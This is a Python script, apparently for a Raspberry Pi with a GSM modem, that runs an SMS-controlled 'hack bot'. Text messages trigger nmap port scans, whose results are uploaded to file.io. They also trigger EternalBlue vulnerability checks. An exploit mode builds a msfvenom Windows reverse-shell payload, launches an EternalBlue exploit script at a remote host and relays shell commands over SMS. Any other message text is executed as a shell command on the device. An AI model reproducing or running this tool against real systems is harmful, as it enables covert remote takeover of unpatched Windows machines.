import serial
import os
import time
from extactMsg import extactMsg
import requests
from fpdf import FPDF
import subprocess
from pwn import *
cmd = ''
d = ''
import nmap
def Rec():
    global cmd,d
    while True:
        mainSer.flushInput()
        mainSer.flushOutput()
        command = b'AT+CMGL="REC UNREAD"\r\n'
        time.sleep(0.5)
        mainSer.write(command)
        time.sleep(0.5)
        mainSer.write(command)
        time.sleep(0.5)
        d = mainSer.readall()
        print(d) #For debugging purposes, prints the AT status
        d = extactMsg(d)
        for msg in d:
            cmd = msg['content']
        if cmd != '':
            print(cmd)
            return 1

def ScanMe(ip, port_range):
        nm = nmap.PortScanner()
        nm.scan(ip, arguments = '-n -sT -p' +port_range)
        result = ''

        for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                        lport = nm[host][proto].keys()
                        #lport.sort()
                        for port in lport:

                                result += '%s (%s)\t' % (port, nm[host][proto][port]['state'])
                                print(result)


        return result

def sendSMS(recipient,message):
    try:
        phone = serial.Serial("/dev/ttyACM1",  460800, timeout=5)
        time.sleep(0.5)
        phone.write(b'ATZ\r')
        time.sleep(0.5)
        phone.write(b'AT+CMGF=1\r') # SMS mode not PDU
        time.sleep(0.5)
        phone.write(b'AT+CMGS="' + recipient.encode() + b'"\r')
        time.sleep(0.5)
        phone.write(message.encode() + b"\r")
        time.sleep(0.5)
        phone.write(bytes([26]))
        time.sleep(0.5)
    except:
        print("Failed to send, try restating the modem.")
    finally:
        print("Message sent successfully")
        phone.close()

def venom(Lhost,Lport):
    cmd = f'msfvenom -p windows/x64/shell_reverse_tcp -f raw -o /home/pi/sc_x64_msf.bin EXITFUNC=thread LHOST={Lhost} LPORT={Lport}'
    sendSMS('<Enter your phone number>',"Payload in creation, please Wait")
    print(Lhost + Lport) #For testing
    res = os.system(cmd)
    print("payload created")
    sendSMS('<Enter your phone number>',"Payload is ready")

def open_ser():
    ser = serial.Serial("/dev/ttyACM1", 460800, timeout=5)
    time.sleep(0.5)
    ser.write(b'ATZ\r')
    time.sleep(0.5)
    ser.write(b'AT+CMGF=1\r')
    time.sleep(0.5)
    return ser

mainSer = open_ser()

sendSMS('<Enter your phone number here>','The Bot is ready to HACK!\t  send "help" for commands usage.')
print('The Bot is ready to HACK!\t  send "help" for commands usage.')
while True:
    cmd = ''
    Rec()
    #cmd=cmd.split() #check white spaces if needed
    if cmd == 'help':
        cmd = ''
        print('Send "nmap" in a message then <ip> <port_range>')
        print('Send "check" in a message then <ip> to check for EternalBlue.')
        print('Send "exploit" in a message then <ip> to exploit the raget.')
        sendSMS('<Enter your phone number here>','-Send "nmap" in a message then <ip> <port_range>.    -Send "check" in a message then <ip> to check for EternalBlue.')
        time.sleep(2)
        sendSMS("<Enter your phone number here>",'-Send "exploit" in a message then <ip> to pwn.                    -Or any linux commands to execute')
        continue
    if cmd == 'check':
        cmd = ''
        print("EternalBlue Checker")
        print("Waiting for IP")
        sendSMS('<Enter your phone number here>',"EternalBlue Checker, Waiting for IP")
        Rec()
        #cmd=cmd.split()
        print(cmd)
        #time.sleep(2)
        sendSMS('<Enter your phone number here>', 'IP received, Scanning started')
        print("Scanning started")
        subprocess.Popen(['nmap','-sV','-p','139,445','--script=smb-vuln*',cmd ,'-oA','check']).wait()  #Could be like venom function
        nm_et = open("check.nmap", "r")
        if "State: VULNERABLE" in nm_et.read():
            print("Host is Vulnerable to EternalBlue")
            sendSMS('<Enter your phone number here>','Host is Vulnerable to EternalBlue')
        else:
            print("Host is not Vulnerable to EternalBlue")
            sendSMS('<Enter your phone number here>', "Host is not Vulnerable to EternalBlue")
        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", size = 11)
        nm_et = open("check.nmap", "r")
        for j in nm_et:
            pdf.cell(200, 10, txt = j, ln = 1, align = 'L')
        pdf.output("output.pdf")
        nm_et.close
        print("file is now .pdf let's upload")
        url = 'https://file.io/?title='
        files = {'file': open('output.pdf', 'rb')}
        r = requests.post(url, files=files)
        print(r.status_code)
        nm_et.close
        PDF=r.text
        link = PDF[183 :211]
        print(link)
        time.sleep(2)
        sendSMS('<Enter your phone number here>',link)
        continue
    if  cmd == 'exploit':
        sendSMS('<Enter your phone number here>',"Enter Lhost and Lport and Rhost Ex: 127.0.0.1 1234 127.0.0.1")
        cmd = ''
        Rec()
        cmd = cmd.split()
        print('Lhost '+ cmd[0]+ ' Port '+ cmd[1]+ ' Rhost '+cmd[2]) #for Debugging
        venom(cmd[0],cmd[1])
        l = listen(cmd[1])   #port
        os.system(f'python3 eternalblue_exploit7.py {cmd[2]} sc_x64.bin')
        while True:
            cmd = ''
            sendSMS('<Enter your phone number here>',"Connection is UP, send a command to execute. or 'exit' to return to Pi.")
            Rec()
            if cmd  == 'exit':   #Added new
                l.close()
                print("Connection Closed, Exiting....")
                cmd = ''
                sendSMS('<Enter your phone number here>',"Reverse shell closed, returning to Pi.")
                print("Received "+cmd) # For debugging
                Rec()
                break
            l.sendline(bytes("{}".format(cmd).encode()))
            print("Execution Success")
            response = l.recv()
            print(response)
            response = response.decode()
            response = response.split('\n')
            print(response)
            res_msg = ''
            if response: # if true divide the msg.
                sum_res = 0
                for line_res in response:
                    sum_res += len(line_res) + 1
                    if sum_res > 160:
                        print(res_msg)
                        sendSMS('<Enter your phone number here>', res_msg.strip('\n'))
                        time.sleep(2) # Adding time between messages
                        sum_res = len(line_res) + 1
                        res_msg = line_res + ('\n')
                    else:
                        res_msg += line_res + ('\n')
            print(res_msg)   #Rest of the message.
            time.sleep(2)
            sendSMS('<Enter your phone number here>',res_msg)
    if cmd == 'nmap':
        cmd=''
        print("Nmap mode")
        sendSMS('<Enter your phone number here>', "Send <IP> <Port_Range>")
        Rec()
        cmd=cmd.split() # if only the IP was given, send appropriate error
        print(cmd[0])
        print(cmd[1])
        print("Start scanning")
        y= subprocess.check_output(['nmap','-n','-sV', '-sT','-p' +cmd[1] , cmd[0]])
        #put the output in a file
        f = open("myfile.txt", "wb")
        f.write(y)
        f.close
        print("File created!")
        #convert the txt file to pdf
        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", size = 14)
        f = open("myfile.txt", "r")
        for x in f:
            pdf.cell(200, 10, txt = x, ln = 1, align = 'L')
        pdf.output("output.pdf")
        f.close
        print("file is now .pdf let's upload")
        url = 'https://file.io/?title='
        files = {'file': open('output.pdf', 'rb')}
        r = requests.post(url, files=files)
        print(r.status_code)
        f.close
        x=r.text
        link= x[183 :211]
        print(link)
        print(ScanMe(cmd[0],cmd[1])) #for printing nmap on terminal
        port=ScanMe(cmd[0],cmd[1])
        if port == '':
            print("No open ports in the specified range")
            sendSMS('<Enter your phone number here>','No open ports in the specified range')
        else:
            sendSMS('<Enter your phone number here>',ScanMe(cmd[0],cmd[1]))
        time.sleep(2)
        sendSMS('<Enter your phone number here>',link)
        print("Scanning finished")
        continue
    while True:
            sum = 0
            print('executing')
            result = os.popen(cmd + " 2>&1").read().strip('\n')   #Error Handeling
            result = result.split('\n')
            message = ""
            for line in result:
                sum += len(line) + 1
                if sum > 160:
                    print(message.strip('\n'))
                    sendSMS('<Enter your phone number here>', message.strip('\n'))
                    sum = len(line) + 1
                    message = line + ('\n')
                else:
                    message += line + ('\n')
            print(message.strip('\n'))
            time.sleep(2)
            sendSMS('<Enter your phone number here>', message.strip('\n'))
            break
